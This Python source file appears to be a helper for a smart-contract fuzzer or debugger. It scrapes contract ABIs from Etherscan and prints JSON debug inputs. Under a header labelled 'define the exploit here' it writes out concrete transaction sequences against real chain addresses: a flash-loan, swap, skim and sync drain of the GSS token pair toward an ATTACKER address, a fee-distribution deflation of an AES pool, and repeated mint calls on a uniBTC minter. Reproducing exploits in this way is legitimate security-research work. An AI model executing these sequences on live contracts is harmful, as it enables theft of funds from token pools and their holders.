from web3 import Web3
import json

import functools
import re
import requests
from retry import retry

headers = {
    'authority': 'etherscan.io',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
              'application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                  'Chrome/108.0.0.0 Safari/537.36',
}

NORMAL = {
    "input_type": "ABI",
    "caller": "0x35c9dfd76bf02107ff4f7128bd69716612d31ddb",
    "contract": "0x37e42b961ae37883bac2fc29207a5f88efa5db66",
    # "data": None,
    "direct_data": "",
    "txn_value": None, "step": False,
    "env": {
        "cfg": {
            "chain_id": "0x0000000000000000000000000000000000000000000000000000000000000001",
            "spec_id": "LATEST",
            "perf_analyse_created_bytecodes": "Analyse",
            "limit_contract_code_size": None
        },
        "block": {
            "number": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "coinbase": "0x0000000000000000000000000000000000000000",
            "timestamp": "0x0000000000000000000000000000000000000000000000000000000000000001",
            "difficulty": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "prevrandao": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "basefee": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "gas_limit": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        },
        "tx": {
            "caller": "0x0000000000000000000000000000000000000000",
            "gas_limit": 18446744073709551615,
            "gas_price": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "gas_priority_fee": None,
            "transact_to": {"Call": "0x0000000000000000000000000000000000000000"},
            "value": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "data": "0x",
            "chain_id": None,
            "nonce": None,
            "access_list": []
        }
    },
    "liquidation_percent": 0,
    "randomness": [0],
    "repeat": 1,
    "layer": 0,
    "call_leak": 4294967295
}


def get_endpoint(network):
    if network == "eth":
        return "https://etherscan.io"
    elif network == "bsc":
        return "https://bscscan.com"
    elif network == "polygon":
        return "https://polygonscan.com"
    elif network == "mumbai":
        return "https://mumbai.polygonscan.com"
    else:
        raise Exception("Unknown network")


def int_to_byte32(value):
    return Web3.to_hex(Web3.to_bytes(value).rjust(32, b'\0'))


@functools.lru_cache(maxsize=10240)
@retry(tries=3, delay=0.5, backoff=2)
def fetch_etherscan_contract_abi(network, token_address):
    finder = re.compile('id="js-copytextarea2" style="height: 200px; max-height: 400px; margin-top: 5px;">(.+?)</pre>')
    url = f"{get_endpoint(network)}/address/{token_address}"
    response = requests.get(url, headers=headers)
    response.raise_for_status()
    contract_abi = []
    for i in finder.findall(response.text):
        contract_abi = json.loads(i)

    if "loadIframeSourceProxyRead" in response.text:
        # this is a proxy contract, we need to merge with the implementation contract abi
        base_address_finder = re.compile(" at <a href=\'(.+?)\'>")
        base_address = base_address_finder.findall(response.text)
        if len(base_address) == 0:
            print("Failed to find base address for proxy contract")
        else:
            base_address = base_address[0].split("/")[-1].split("?")[0].split("#")[0]
            res = fetch_etherscan_contract_abi(network, base_address)
            contract_abi += res
    return contract_abi


def generate_debug_file(target, data):
    w3 = Web3()

    for i in data:
        current = NORMAL.copy()
        if "name" in i and "args" in i:
            abi = fetch_etherscan_contract_abi(target, i["target"])
            contract = w3.eth.contract(address=i["target"], abi=abi)
            abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
            current["direct_data"] = abi_encoded
        elif "direct_data" in i:
            current["direct_data"] = i["direct_data"]
        current["input_type"] = "ABI" if ("ty" not in i or i["ty"] == "abi") else "Borrow"
        current["caller"] = i["caller"]
        current["contract"] = i["target"]
        current["liquidation_percent"] = i["liquidation_percent"] if "liquidation_percent" in i else 0
        current["randomness"] = [i["rand"]] if "rand" in i else [0]
        current["txn_value"] = int_to_byte32(i["value"] if "value" in i else 0)  # todo check
        current["repeat"] = i["repeats"] if "repeats" in i else 1
        current["env"]["tx"]["caller"] = i["caller"]
        current["env"]["tx"]["transact_to"]["Call"] = i["target"]
        print(json.dumps(current))


################## DEFINE THE EXPLOIT HERE #####################

GSS = Web3.to_checksum_address("0x37e42B961AE37883BAc2fC29207A5F88eFa5db66")
GSS_USDT = Web3.to_checksum_address("0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0")
GSS_DAO = Web3.to_checksum_address("0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64")
ATTACKER = Web3.to_checksum_address("0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb")
FLASHLOAN = Web3.to_checksum_address("0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A")
USDT = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
ROUTER = Web3.to_checksum_address("0x10ED43C718714eb63d5aA57B78B54704E256024E")
GSSExp = [
    # {
    #     "ty": "borrow",
    #     "caller": ATTACKER,
    #     "target": GSS,
    #     "value": int(3000e18),
    #     "rand": 18
    # },
    {
        "ty": "abi",
        "caller": FLASHLOAN,
        "target": USDT,
        "name": "transfer", "args": [ATTACKER, int(30000e18)],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": USDT,
        "name": "approve", "args": [ROUTER, int(30000e18)],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": ROUTER,
        "name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
        "args": [
            int(30000e18), 0, [USDT, GSS], ATTACKER, 1000000000000
        ]
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": GSS,
        "name": "transfer", "args": [GSS_USDT, 707162351662098288993328],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": GSS_USDT,
        "name": "skim", "args": [GSS_DAO],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": GSS_USDT,
        "name": "sync", "args": [],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": GSS_DAO,
        "name": "skim", "args": [ATTACKER],
        "liquidation_percent": 10,  # sell 100% of the tokens
    },

]


AES = Web3.to_checksum_address("0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907")
AES_USDT = Web3.to_checksum_address("0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3")


AES_DEFLATE = [
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": AES,
        "name": "distributeFee", "args": [],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": AES_USDT,
        "name": "sync", "args": [],
    }
]


BTC_MINTER = Web3.to_checksum_address("0x047d41f2544b7f63a8e991af2068a363d210d6da")

UNIBTC = [
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": BTC_MINTER,
        "direct_data": "1249c58b",
        "value": int(1e18),
        "liquidation_percent": 10,  # sell 100% of the tokens
    }, 
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": BTC_MINTER,
        "direct_data": "1249c58b",
        "value": int(1e18),
        "liquidation_percent": 10,  # sell 100% of the tokens
    }
]

generate_debug_file("eth", UNIBTC)
